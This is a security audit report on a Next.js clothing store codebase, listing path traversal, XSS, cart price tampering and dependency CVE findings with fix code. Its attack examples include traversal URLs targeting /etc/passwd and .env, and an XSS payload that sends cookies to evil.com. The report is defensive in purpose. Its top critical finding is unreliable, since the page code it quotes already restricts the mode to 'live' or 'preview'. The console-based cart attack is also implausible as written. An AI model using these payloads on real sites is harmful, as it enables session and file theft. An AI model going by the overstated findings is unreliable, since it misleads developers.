# Security Scan Report

**Timestamp**: 2026-01-17T21:28:35Z
**Scan Type**: Targeted - Store Website Code Addition
**Status**: FAIL - Critical and High Severity Issues Found

## Executive Summary

- **Total Findings**: 19 (Critical: 3, High: 5, Medium: 8, Low: 3)
- **New Issues**: 19 (all new with store implementation)
- **Success Criteria Met**: NO - Multiple critical and high severity issues identified
- **Immediate Action Required**: Yes - Critical path traversal and XSS vulnerabilities must be fixed before deployment

**Risk Assessment**: The store implementation introduces several security vulnerabilities that could lead to:
- Arbitrary file system access (Path Traversal)
- Cross-Site Scripting (XSS) attacks
- Sensitive data exposure
- Denial of Service via dependency vulnerabilities

---

## Critical Severity Findings

### [CRITICAL-01] - Path Traversal Vulnerability in getConfig/saveConfig

**Severity**: Critical
**Location**: `/Users/lukalavric/repos/blip-ship/lib/db.ts:105-117`
**CVSS Score**: 9.1 (Critical)
**CWE**: CWE-22 (Path Traversal)

**Description**:
The `getConfig()` and `saveConfig()` functions accept a `mode` parameter that is directly interpolated into file paths without proper validation. An attacker can supply arbitrary values to read or write files outside the intended `data/` directory.

**Vulnerable Code**:
```typescript
// lib/db.ts:105-117
export async function getConfig(mode: 'live' | 'preview'): Promise<SiteConfig> {
  const filePath = path.join(DATA_DIR, `config-${mode}.json`);  // ⚠️ Unvalidated input
  const data = await fs.readFile(filePath, 'utf-8');
  return JSON.parse(data);
}

export async function saveConfig(mode: 'live' | 'preview', config: SiteConfig): Promise<void> {
  const filePath = path.join(DATA_DIR, `config-${mode}.json`);  // ⚠️ Unvalidated input
  await fs.writeFile(filePath, JSON.stringify(config, null, 2));
}
```

**Attack Vector**:
```typescript
// app/store/page.tsx:17 - mode comes from URL query parameter
const mode = params.mode === 'preview' ? 'preview' : 'live';

// Malicious request examples:
// GET /store?mode=../../etc/passwd  → Reads /etc/passwd
// GET /store?mode=../../../etc/hosts → Reads system files
// POST to API with mode=../../.env → Writes to .env file
```

**Impact**:
- **Read Access**: Attackers can read any file accessible to the Node.js process (environment variables, source code, database credentials, SSH keys)
- **Write Access**: If `saveConfig` is exposed via API, attackers can overwrite critical files
- **Information Disclosure**: Exposure of `.env` files, `package.json`, source code, and configuration files
- **Privilege Escalation**: Reading sensitive files may reveal credentials for lateral movement

**Exploitability**: Easy - Requires only URL manipulation, no authentication needed

**Remediation Steps**:

1. **Immediate Fix - Whitelist Validation**:
```typescript
export async function getConfig(mode: 'live' | 'preview'): Promise<SiteConfig> {
  // Validate mode against whitelist BEFORE using it
  if (mode !== 'live' && mode !== 'preview') {
    throw new Error('Invalid config mode. Must be "live" or "preview".');
  }

  const filePath = path.join(DATA_DIR, `config-${mode}.json`);

  // Additional safety check: ensure resolved path is within DATA_DIR
  const resolvedPath = path.resolve(filePath);
  const resolvedDataDir = path.resolve(DATA_DIR);

  if (!resolvedPath.startsWith(resolvedDataDir + path.sep)) {
    throw new Error('Path traversal attempt detected');
  }

  const data = await fs.readFile(filePath, 'utf-8');
  return JSON.parse(data);
}
```

2. **Server-Side Route Validation**:
```typescript
// app/store/page.tsx
export default async function Store({
  searchParams,
}: {
  searchParams: Promise<{ mode?: string }>;
}) {
  const params = await searchParams;

  // Strict validation - reject anything not exactly 'preview'
  const mode: 'live' | 'preview' = params.mode === 'preview' ? 'preview' : 'live';

  let config;
  try {
    config = await getConfig(mode);
  } catch (error) {
    // Log security event for monitoring
    console.error('Config access attempt failed:', error);
    config = await getConfig('live'); // Safe fallback
  }
  // ...
}
```

3. **Add Path Traversal Tests**:
```typescript
// tests/security/path-traversal.test.ts
describe('Path Traversal Protection', () => {
  it('should reject path traversal attempts in mode parameter', async () => {
    await expect(getConfig('../../etc/passwd' as any)).rejects.toThrow();
    await expect(getConfig('../.env' as any)).rejects.toThrow();
  });

  it('should only accept live or preview modes', async () => {
    await expect(getConfig('live')).resolves.toBeDefined();
    await expect(getConfig('preview')).resolves.toBeDefined();
    await expect(getConfig('malicious' as any)).rejects.toThrow();
  });
});
```

4. **Security Monitoring**: Log all file access attempts to detect attack patterns

**References**:
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

### [CRITICAL-02] - Unvalidated User Input in Cart Operations

**Severity**: Critical
**Location**: `/Users/lukalavric/repos/blip-ship/context/CartContext.tsx:32-43`
**CWE**: CWE-20 (Improper Input Validation)

**Description**:
The cart context accepts arbitrary product data from client-side code without validation. Attackers can manipulate product prices, IDs, names, and image URLs to exploit business logic or perform XSS attacks.

**Vulnerable Code**:
```typescript
// context/CartContext.tsx:32-43
const addItem = (item: Omit<CartItem, 'quantity'>) => {
  setItems((prev) => {
    const existing = prev.find((i) => i.id === item.id);
    if (existing) {
      return prev.map((i) =>
        i.id === item.id ? { ...i, quantity: i.quantity + 1 } : i  // ⚠️ No validation
      );
    }
    return [...prev, { ...item, quantity: 1 }];  // ⚠️ Accepts any data
  });
  setIsOpen(true);
};
```

**Attack Vectors**:

1. **Price Manipulation**:
```javascript
// Attacker opens browser console
import { useCart } from '@/context/CartContext';
const { addItem } = useCart();

// Add item with manipulated price
addItem({
  id: 'prod_001',
  name: 'Classic Heavyweight Hoodie',
  price: 0.01,  // Changed from $89.00 to $0.01
  image: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7'
});
```

2. **XSS via Product Name**:
```javascript
addItem({
  id: 'xss_attack',
  name: '<img src=x onerror="alert(document.cookie)">',
  price: 1,
  image: 'https://evil.com/payload.jpg'
});
```

3. **Business Logic Bypass**:
```javascript
// Add items with negative quantities via direct state manipulation
// Circumvent checkout validation
```

**Impact**:
- **Financial Loss**: Users can manipulate prices to purchase items at arbitrary costs
- **XSS Attacks**: Malicious product names/data can inject scripts when rendered
- **Business Logic Bypass**: Invalid quantities, negative prices, or fake product IDs
- **Payment Fraud**: Manipulated cart totals bypass payment validation

**Exploitability**: Easy - Browser console access, no authentication required

**Remediation Steps**:

1. **Server-Side Price Validation** (Required before payment processing):
```typescript
// app/api/checkout/route.ts (must be created)
export async function POST(request: Request) {
  const { items } = await request.json();

  // Load product catalog from secure source
  const products = await getConfig('live');

  // Validate each item against catalog
  for (const item of items) {
    const catalogProduct = products.products.items.find(p => p.id === item.id);

    if (!catalogProduct) {
      return Response.json({ error: 'Invalid product' }, { status: 400 });
    }

    // CRITICAL: Use server-side price, never trust client
    if (item.price !== catalogProduct.price) {
      return Response.json({ error: 'Price mismatch detected' }, { status: 400 });
    }

    // Validate quantity
    if (item.quantity < 1 || item.quantity > 99) {
      return Response.json({ error: 'Invalid quantity' }, { status: 400 });
    }
  }

  // Proceed with payment...
}
```

2. **Input Sanitization in Cart Context**:
```typescript
import DOMPurify from 'isomorphic-dompurify';

const addItem = (item: Omit<CartItem, 'quantity'>) => {
  // Sanitize text fields to prevent XSS
  const sanitizedItem = {
    id: item.id.replace(/[^a-zA-Z0-9_-]/g, ''), // Alphanumeric + underscore/dash only
    name: DOMPurify.sanitize(item.name, { ALLOWED_TAGS: [] }), // Strip all HTML
    price: Math.max(0, Number(item.price)), // Ensure non-negative number
    image: item.image.match(/^https?:\/\//) ? item.image : '', // URL validation
  };

  // Add to cart
  setItems((prev) => {
    const existing = prev.find((i) => i.id === sanitizedItem.id);
    if (existing) {
      return prev.map((i) =>
        i.id === sanitizedItem.id ? { ...i, quantity: Math.min(i.quantity + 1, 99) } : i
      );
    }
    return [...prev, { ...sanitizedItem, quantity: 1 }];
  });
};
```

3. **Add Product Validation Schema**:
```typescript
import { z } from 'zod';

const CartItemSchema = z.object({
  id: z.string().regex(/^prod_[a-zA-Z0-9]+$/),
  name: z.string().min(1).max(200),
  price: z.number().positive().max(10000),
  image: z.string().url().startsWith('https://'),
  quantity: z.number().int().min(1).max(99),
});
```

4. **Critical Note**: ALL price calculations for checkout MUST happen server-side. Never trust client-submitted prices.

**References**:
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [OWASP Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)

---

### [CRITICAL-03] - Next.js Authorization Bypass (CVE-2025-29927)

**Severity**: Critical
**Location**: Dependency - `next@^15.1.4` (installed: 14.2.21)
**CVSS Score**: 9.1 (Critical)
**CVE**: CVE-2025-29927

**Description**:
The installed version of Next.js (14.2.21) contains a critical authorization bypass vulnerability. Attackers can bypass authorization checks in middleware by manipulating the `x-middleware-subrequest` header.

**Affected Version**: next@14.2.21
**Patched Version**: ≥14.2.25 (Current: 15.1.4 recommended)

**Impact**:
- Complete bypass of authorization checks implemented in Next.js middleware
- Unauthorized access to protected routes and resources
- Potential for privilege escalation if middleware enforces role-based access

**Exploitability**: Easy - Simple HTTP header manipulation

**Remediation Steps**:

1. **Immediate Update** (REQUIRED):
```bash
pnpm update next@15.1.4
```

2. **Verify No Middleware Authorization**:
```bash
# Check if middleware.ts exists
ls /Users/lukalavric/repos/blip-ship/middleware.ts

# If middleware exists, audit all authorization logic
# and ensure it's implemented at the component/API route level as well
```

3. **Defense in Depth**: Even after patching, implement authorization at multiple layers:
   - API route handlers (not just middleware)
   - Server component data fetching
   - Database query filters

**References**:
- [GHSA-f82v-jwr5-mffw](https://github.com/advisories/GHSA-f82v-jwr5-mffw)
- [CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)

---

## High Severity Findings

### [HIGH-01] - Cross-Site Scripting (XSS) via Unsanitized Config Data

**Severity**: High
**Location**: Multiple components rendering config data
**CWE**: CWE-79 (Cross-Site Scripting)

**Description**:
User-provided configuration data (headlines, product names, testimonials) is rendered directly into the DOM without sanitization. If an attacker can modify config files, they can inject malicious scripts.

**Vulnerable Locations**:

1. **Hero Component** (`/Users/lukalavric/repos/blip-ship/components/store/Hero.tsx:75-83`):
```typescript
<h1 style={{...}}>
  {config.headline}  {/* ⚠️ Unsanitized user input */}
</h1>
<p style={{...}}>
  {config.subheadline}  {/* ⚠️ Unsanitized user input */}
</p>
```

2. **ProductGrid Component** (`/Users/lukalavric/repos/blip-ship/components/store/ProductGrid.tsx:135-139`):
```typescript
<h3 style={{...}}>
  {product.name}  {/* ⚠️ Unsanitized product name */}
</h3>
```

3. **Testimonials Component** (`/Users/lukalavric/repos/blip-ship/components/store/Testimonials.tsx:52-54`):
```typescript
<p style={{...}}>
  &ldquo;{testimonial.quote}&rdquo;  {/* ⚠️ Unsanitized testimonial */}
</p>
```

4. **CartDrawer Component** (`/Users/lukalavric/repos/blip-ship/components/store/CartDrawer.tsx:453-454`):
```typescript
<h3 style={{...}}>
  {item.name}  {/* ⚠️ Renders cart item name without sanitization */}
</h3>
```

**Attack Vector**:
```json
// data/config-live.json - Malicious payload
{
  "hero": {
    "headline": "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>",
    "subheadline": "XSS Attack"
  },
  "products": {
    "items": [{
      "name": "<script>alert('XSS')</script>",
      "price": 100
    }]
  }
}
```

**Impact**:
- **Session Hijacking**: Steal authentication cookies/tokens
- **Credential Theft**: Inject fake login forms
- **Malware Distribution**: Redirect users to malicious sites
- **Defacement**: Alter page content
- **Keylogging**: Capture user inputs

**Exploitability**: Medium - Requires ability to modify config files (via path traversal vulnerability or compromised admin access)

**Remediation Steps**:

1. **Install Sanitization Library**:
```bash
pnpm add isomorphic-dompurify dompurify
pnpm add -D @types/dompurify
```

2. **Sanitize All Config Data**:
```typescript
// lib/db.ts
import DOMPurify from 'isomorphic-dompurify';

export async function getConfig(mode: 'live' | 'preview'): Promise<SiteConfig> {
  // ... validation code ...

  const data = await fs.readFile(filePath, 'utf-8');
  const config = JSON.parse(data);

  // Sanitize all text fields
  return {
    ...config,
    hero: {
      ...config.hero,
      headline: DOMPurify.sanitize(config.hero.headline, { ALLOWED_TAGS: [] }),
      subheadline: DOMPurify.sanitize(config.hero.subheadline, { ALLOWED_TAGS: [] }),
    },
    products: {
      ...config.products,
      sectionTitle: DOMPurify.sanitize(config.products.sectionTitle, { ALLOWED_TAGS: [] }),
      items: config.products.items.map(item => ({
        ...item,
        name: DOMPurify.sanitize(item.name, { ALLOWED_TAGS: [] }),
        badge: item.badge ? DOMPurify.sanitize(item.badge, { ALLOWED_TAGS: [] }) : undefined,
      })),
    },
    testimonials: {
      ...config.testimonials,
      sectionTitle: DOMPurify.sanitize(config.testimonials.sectionTitle, { ALLOWED_TAGS: [] }),
      items: config.testimonials.items.map(item => ({
        quote: DOMPurify.sanitize(item.quote, { ALLOWED_TAGS: [] }),
        author: DOMPurify.sanitize(item.author, { ALLOWED_TAGS: [] }),
      })),
    },
  };
}
```

3. **Content Security Policy** (Defense in Depth):
```typescript
// next.config.js
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline'", // Remove unsafe-inline in production
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' https://images.unsplash.com data:",
              "font-src 'self'",
              "connect-src 'self'",
              "frame-ancestors 'none'",
            ].join('; '),
          },
        ],
      },
    ];
  },
};
```

**References**:
- [CWE-79: Cross-Site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

### [HIGH-02] - Sensitive Payment Data Not Transmitted Securely

**Severity**: High
**Location**: `/Users/lukalavric/repos/blip-ship/components/store/CartDrawer.tsx:270-397`
**CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)

**Description**:
The payment form collects credit card data but performs no actual transmission. If this is later implemented without proper PCI compliance, it will transmit card data in plaintext.

**Vulnerable Code**:
```typescript
// components/store/CartDrawer.tsx:276-305
<input
  type="text"
  required
  placeholder="4242 4242 4242 4242"  // Card number
  maxLength={19}
  style={inputStyle}
/>
<input
  type="text"
  required
  placeholder="123"  // CVV
  maxLength={4}
  style={inputStyle}
/>
```

**Current Risk**: Medium (currently a mock, no real payment processing)
**Future Risk**: Critical if implemented without PCI compliance

**Impact**:
- **PCI-DSS Violation**: Handling raw card data without compliance
- **Data Breach**: Intercepted card numbers, CVV, expiration dates
- **Legal Liability**: Fines and lawsuits from data breaches
- **Reputation Damage**: Loss of customer trust

**Remediation Steps**:

1. **NEVER handle raw card data directly**. Use a PCI-compliant payment processor:

```typescript
// ✅ CORRECT: Use Stripe Elements (tokenization on client-side)
import { loadStripe } from '@stripe/stripe-js';
import { Elements, CardElement, useStripe, useElements } from '@stripe/react-stripe-js';

const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY!);

function PaymentForm() {
  const stripe = useStripe();
  const elements = useElements();

  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!stripe || !elements) return;

    // Create payment method (card data never touches your server)
    const { error, paymentMethod } = await stripe.createPaymentMethod({
      type: 'card',
      card: elements.getElement(CardElement)!,
    });

    if (error) {
      console.error(error);
      return;
    }

    // Send only the payment method ID to your server
    const response = await fetch('/api/checkout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        paymentMethodId: paymentMethod.id,
        amount: totalPrice,
        items: items,
      }),
    });
  };
}

// Wrap in Elements provider
<Elements stripe={stripePromise}>
  <PaymentForm />
</Elements>
```

2. **Server-Side Payment Intent** (app/api/checkout/route.ts):
```typescript
import Stripe from 'stripe';

const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!, {
  apiVersion: '2024-11-20.acacia',
});

export async function POST(request: Request) {
  const { paymentMethodId, amount, items } = await request.json();

  // Validate items and calculate amount server-side (never trust client)
  const validatedAmount = await validateAndCalculateAmount(items);

  // Create payment intent with Stripe
  const paymentIntent = await stripe.paymentIntents.create({
    amount: validatedAmount * 100, // Convert to cents
    currency: 'usd',
    payment_method: paymentMethodId,
    confirm: true,
  });

  return Response.json({ success: true, intentId: paymentIntent.id });
}
```

3. **Remove Mock Payment Form**: Delete the current mock credit card inputs and replace with Stripe Elements.

4. **Alternative**: Use Stripe Checkout (hosted payment page - simplest PCI compliance):
```typescript
const handleCheckout = async () => {
  const response = await fetch('/api/create-checkout-session', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ items }),
  });

  const { sessionId } = await response.json();

  const stripe = await loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY!);
  await stripe?.redirectToCheckout({ sessionId });
};
```

**References**:
- [PCI DSS Compliance](https://www.pcisecuritystandards.org/)
- [Stripe Security Best Practices](https://stripe.com/docs/security/guide)
- [CWE-319: Cleartext Transmission](https://cwe.mitre.org/data/definitions/319.html)

---

### [HIGH-03] - Next.js Denial of Service Vulnerabilities

**Severity**: High
**Location**: Dependency - `next@14.2.21`
**CVE**: CVE-2025-55184, CVE-2025-67779

**Description**:
Two related DoS vulnerabilities in Next.js Server Components allow attackers to send crafted HTTP requests that cause infinite loops and CPU exhaustion.

**Affected Versions**:
- CVE-2025-55184: Fixed in ≥14.2.34
- CVE-2025-67779: Fixed in ≥14.2.35

**Impact**:
- Server process becomes unresponsive
- Sustained CPU consumption (100%)
- Service unavailability for legitimate users
- Potential infrastructure cost increases

**Exploitability**: Easy - Simple HTTP request to App Router endpoint

**Remediation Steps**:

1. **Update Next.js** (REQUIRED):
```bash
pnpm update next@15.1.4
```

2. **Implement Rate Limiting**:
```typescript
// middleware.ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '10 s'),
});

export async function middleware(request: Request) {
  const ip = request.headers.get('x-forwarded-for') ?? 'anonymous';
  const { success } = await ratelimit.limit(ip);

  if (!success) {
    return new Response('Too Many Requests', { status: 429 });
  }

  return NextResponse.next();
}
```

3. **Monitor Resource Usage**: Set up alerts for unusual CPU/memory spikes

**References**:
- [GHSA-mwv6-3258-q52c](https://github.com/advisories/GHSA-mwv6-3258-q52c)
- [GHSA-5j59-xgg2-r9c4](https://github.com/advisories/GHSA-5j59-xgg2-r9c4)

---

### [HIGH-04] - Image Optimization Cache Poisoning (CVE-2025-57752)

**Severity**: High
**Location**: Dependency - `next@14.2.21`
**CVSS Score**: 6.2
**CVE**: CVE-2025-57752

**Description**:
Next.js Image Optimization incorrectly caches images from API routes that vary based on request headers (Cookie, Authorization). Cached responses may be served to unauthorized users.

**Affected Version**: next@14.2.21
**Patched Version**: ≥14.2.31

**Impact**:
- Unauthorized access to user-specific images
- Privacy violations (e.g., leaked private photos)
- Session token exposure if images contain sensitive data

**Remediation Steps**:
1. Update to Next.js ≥15.1.4
2. Review all API routes that serve images
3. Add explicit cache headers to image responses:
```typescript
return new Response(imageBuffer, {
  headers: {
    'Cache-Control': 'private, no-store',
    'Vary': 'Cookie, Authorization',
  },
});
```

**References**:
- [GHSA-g5qg-72qw-gw5v](https://github.com/advisories/GHSA-g5qg-72qw-gw5v)

---

### [HIGH-05] - Server-Side Request Forgery via Middleware (CVE-2025-57822)

**Severity**: High
**Location**: Dependency - `next@14.2.21`
**CVSS Score**: 6.5
**CVE**: CVE-2025-57822

**Description**:
Improper middleware redirect handling allows SSRF attacks when request headers are passed to `NextResponse.next()`.

**Affected Version**: next@14.2.21
**Patched Version**: ≥14.2.32

**Impact**:
- Access to internal services (databases, cloud metadata endpoints)
- Port scanning of internal network
- Bypass of firewall rules

**Remediation Steps**:
1. Update to Next.js ≥15.1.4
2. If using middleware, audit all `NextResponse.next()` calls
3. Never pass untrusted headers directly to redirect functions

**References**:
- [GHSA-4342-x723-ch2f](https://github.com/advisories/GHSA-4342-x723-ch2f)

---

## Medium Severity Findings

### [MEDIUM-01] - Missing CSRF Protection on State-Changing Operations

**Severity**: Medium
**Location**: All form submissions
**CWE**: CWE-352 (Cross-Site Request Forgery)

**Description**:
Newsletter subscription, checkout forms, and cart operations lack CSRF tokens. Attackers can trick users into performing unwanted actions.

**Impact**:
- Unauthorized newsletter subscriptions
- Forced purchases (if payment integration added)
- Cart manipulation

**Remediation**:
1. Implement CSRF tokens for all POST requests
2. Use SameSite cookies: `SameSite=Lax` or `SameSite=Strict`
3. Verify Origin/Referer headers on server-side

**References**:
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

### [MEDIUM-02] - Weak Toast ID Generation (Predictable IDs)

**Severity**: Medium
**Location**: `/Users/lukalavric/repos/blip-ship/context/ToastContext.tsx:23`
**CWE**: CWE-330 (Use of Insufficiently Random Values)

**Description**:
Toast notifications use `Date.now().toString()` for IDs, which is predictable and can lead to collisions in rapid succession.

**Vulnerable Code**:
```typescript
const id = Date.now().toString();  // ⚠️ Predictable, collision-prone
```

**Impact**:
- Toast message collisions if multiple toasts created in same millisecond
- Potential for race conditions in toast dismissal

**Remediation**:
```typescript
import { randomUUID } from 'crypto';

const showToast = useCallback((message: string, type: Toast['type'] = 'success') => {
  const id = randomUUID(); // Cryptographically secure random ID
  setToasts((prev) => [...prev, { id, message, type }]);
  setTimeout(() => {
    setToasts((prev) => prev.filter((t) => t.id !== id));
  }, 3000);
}, []);
```

---

### [MEDIUM-03] - Missing Input Validation on Search Query

**Severity**: Medium
**Location**: `/Users/lukalavric/repos/blip-ship/components/store/Header.tsx:209`
**CWE**: CWE-20 (Improper Input Validation)

**Description**:
Search input accepts arbitrary user input without length limits or sanitization.

**Vulnerable Code**:
```typescript
<input
  type="text"
  placeholder="Search products..."
  value={searchQuery}
  onChange={(e) => setSearchQuery(e.target.value)}  // ⚠️ No validation
  autoFocus
  style={{...}}
/>
```

**Impact**:
- Potential DoS if extremely long strings are submitted
- XSS if search query is reflected in results without sanitization
- Performance degradation with malicious input

**Remediation**:
```typescript
const handleSearchChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  const value = e.target.value;

  // Limit length
  if (value.length > 100) return;

  // Basic sanitization
  const sanitized = DOMPurify.sanitize(value, { ALLOWED_TAGS: [] });
  setSearchQuery(sanitized);
};
```

---

### [MEDIUM-04] - External Image Sources Without Validation

**Severity**: Medium
**Location**: `/Users/lukalavric/repos/blip-ship/data/config-live.json`
**CWE**: CWE-918 (Server-Side Request Forgery)

**Description**:
Product and background images are loaded from external URLs (Unsplash) without domain validation. If config is compromised, malicious images could be served.

**Impact**:
- Serving malicious images (phishing, malware delivery)
- Privacy leaks via tracking pixels
- SSRF if Next.js Image Optimization processes malicious URLs

**Remediation**:
1. Whitelist allowed image domains in `next.config.js`:
```javascript
module.exports = {
  images: {
    remotePatterns: [
      {
        protocol: 'https',
        hostname: 'images.unsplash.com',
        pathname: '/**',
      },
    ],
  },
};
```

2. Validate image URLs in `getConfig()`:
```typescript
const ALLOWED_IMAGE_HOSTS = ['images.unsplash.com'];

function validateImageUrl(url: string): string {
  try {
    const parsed = new URL(url);
    if (!ALLOWED_IMAGE_HOSTS.includes(parsed.hostname)) {
      throw new Error('Disallowed image host');
    }
    return url;
  } catch {
    return ''; // Return empty string for invalid URLs
  }
}
```

---

### [MEDIUM-05] - Unprotected File Write Operation (saveConfig)

**Severity**: Medium
**Location**: `/Users/lukalavric/repos/blip-ship/lib/db.ts:114-117`
**CWE**: CWE-284 (Improper Access Control)

**Description**:
The `saveConfig()` function is exported and can be called from anywhere without access control. If exposed via API route, anyone can modify site configuration.

**Impact**:
- Unauthorized modification of site content
- Defacement attacks
- Malicious configuration injection

**Remediation**:
1. **Do NOT expose saveConfig via public API routes**
2. If admin functionality is needed, implement authentication:
```typescript
// app/api/admin/config/route.ts
import { verifyAdminAuth } from '@/lib/auth';

export async function POST(request: Request) {
  // Verify admin authentication
  const user = await verifyAdminAuth(request);
  if (!user || user.role !== 'admin') {
    return Response.json({ error: 'Unauthorized' }, { status: 403 });
  }

  const { mode, config } = await request.json();

  // Additional validation
  if (!isValidConfig(config)) {
    return Response.json({ error: 'Invalid config' }, { status: 400 });
  }

  await saveConfig(mode, config);
  return Response.json({ success: true });
}
```

---

### [MEDIUM-06] - Client-Side Cart State Vulnerable to Manipulation

**Severity**: Medium
**Location**: `/Users/lukalavric/repos/blip-ship/context/CartContext.tsx`
**CWE**: CWE-602 (Client-Side Enforcement of Server-Side Security)

**Description**:
Cart state is stored entirely client-side in React state without server-side validation. Users can manipulate quantities, prices, and products via browser DevTools.

**Impact**:
- Price manipulation before checkout
- Invalid product IDs in cart
- Bypassing business rules (e.g., max quantity limits)

**Remediation**:
1. Add server-side cart validation endpoint
2. Validate cart contents before payment:
```typescript
// app/api/validate-cart/route.ts
export async function POST(request: Request) {
  const { items } = await request.json();
  const config = await getConfig('live');

  const validatedItems = items.map(item => {
    const product = config.products.items.find(p => p.id === item.id);

    if (!product) {
      throw new Error(`Invalid product: ${item.id}`);
    }

    return {
      ...item,
      price: product.price, // Use server-side price
      name: product.name,   // Use server-side name
      quantity: Math.min(Math.max(1, item.quantity), 99), // Enforce limits
    };
  });

  return Response.json({ items: validatedItems });
}
```

---

### [MEDIUM-07] - Missing Security Headers

**Severity**: Medium
**Location**: Application-wide
**CWE**: CWE-693 (Protection Mechanism Failure)

**Description**:
Critical security headers are missing: CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.

**Impact**:
- Clickjacking attacks
- MIME-type sniffing vulnerabilities
- Referrer information leakage
- XSS attack surface

**Remediation**:
```javascript
// next.config.js
const securityHeaders = [
  {
    key: 'X-Frame-Options',
    value: 'DENY',
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff',
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin',
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()',
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block',
  },
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' https://images.unsplash.com data:",
      "font-src 'self'",
      "object-src 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "frame-ancestors 'none'",
      "upgrade-insecure-requests",
    ].join('; '),
  },
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

---

### [MEDIUM-08] - No Rate Limiting on Form Submissions

**Severity**: Medium
**Location**: Newsletter form, checkout flow
**CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Description**:
Forms lack rate limiting, allowing automated abuse (spam subscriptions, brute force attacks on future auth systems).

**Impact**:
- Email spam via newsletter form
- DoS through excessive submissions
- Database bloat from spam entries

**Remediation**:
1. Implement rate limiting middleware
2. Add CAPTCHA for public forms
3. Use honeypot fields to detect bots

---

## Low Severity Findings

### [LOW-01] - Information Disclosure in Error Messages

**Severity**: Low
**Location**: `/Users/lukalavric/repos/blip-ship/app/store/page.tsx:22-24`
**CWE**: CWE-209 (Information Exposure Through Error Message)

**Description**:
Error messages may leak file system paths or internal implementation details.

**Remediation**:
```typescript
try {
  config = await getConfig(mode);
} catch (error) {
  console.error('Config load failed', error); // Log server-side only
  config = await getConfig('live');
}
```

---

### [LOW-02] - Glob CLI Command Injection (Transitive Dependency)

**Severity**: Low
**Location**: Dependency - `glob@10.3.10` (via eslint-config-next)
**CVE**: CVE-2025-64756

**Description**:
Glob CLI has command injection vulnerability, but only affects CLI usage (not library usage). This is a dev dependency used by ESLint.

**Impact**: Minimal - only affects development environment if glob CLI is used maliciously

**Remediation**:
```bash
pnpm update glob@latest
```

---

### [LOW-03] - Hardcoded Copyright Year

**Severity**: Low (Informational)
**Location**: `/Users/lukalavric/repos/blip-ship/components/store/Footer.tsx:206-208`

**Description**:
Copyright year is hardcoded to 2024, should be dynamic.

**Remediation**:
```typescript
<p style={{...}}>
  &copy; {new Date().getFullYear()} Urban Threads. All rights reserved.
</p>
```

---

## Dependency Vulnerabilities Summary

| CVE ID | Severity | Package | Affected Version | Fixed Version | Status |
|--------|----------|---------|------------------|---------------|--------|
| CVE-2025-29927 | Critical | next | 14.2.21 | ≥14.2.25 | **Update Required** |
| CVE-2025-55184 | High | next | 14.2.21 | ≥14.2.34 | **Update Required** |
| CVE-2025-67779 | High | next | 14.2.21 | ≥14.2.35 | **Update Required** |
| CVE-2025-57752 | High | next | 14.2.21 | ≥14.2.31 | **Update Required** |
| CVE-2025-57822 | High | next | 14.2.21 | ≥14.2.32 | **Update Required** |
| CVE-2025-55173 | Medium | next | 14.2.21 | ≥14.2.31 | **Update Required** |
| CVE-2025-32421 | Low | next | 14.2.21 | ≥14.2.24 | **Update Required** |
| CVE-2025-48068 | Low | next | 14.2.21 | ≥14.2.30 | **Update Required** |
| CVE-2025-64756 | High | glob | 10.3.10 | ≥10.5.0 | **Update Required** |

**Critical Action**: Update Next.js to v15.1.4 immediately to patch all vulnerabilities.

```bash
pnpm update next@15.1.4
pnpm audit fix
```

---

## Security Configuration Review

### Content Security Policy (CSP)
**Status**: FAIL - Not Implemented
**Recommendation**: Add CSP headers to prevent XSS attacks (see MEDIUM-07)

### CORS Configuration
**Status**: PASS - Not Applicable (No API routes exposed yet)
**Future Recommendation**: When adding API routes, implement strict CORS policies

### Cookie Security
**Status**: N/A - No cookies currently used
**Future Recommendation**: When implementing auth, use:
- `HttpOnly` flag (prevent XSS theft)
- `Secure` flag (HTTPS only)
- `SameSite=Lax` or `SameSite=Strict` (CSRF protection)

### HTTPS/TLS
**Status**: N/A - Deployment-specific
**Recommendation**: Ensure production deployment uses HTTPS with TLS 1.2+

---

## Recommendations

### Immediate Actions (Critical/High Priority)

1. **Fix Path Traversal Vulnerability** [CRITICAL-01]
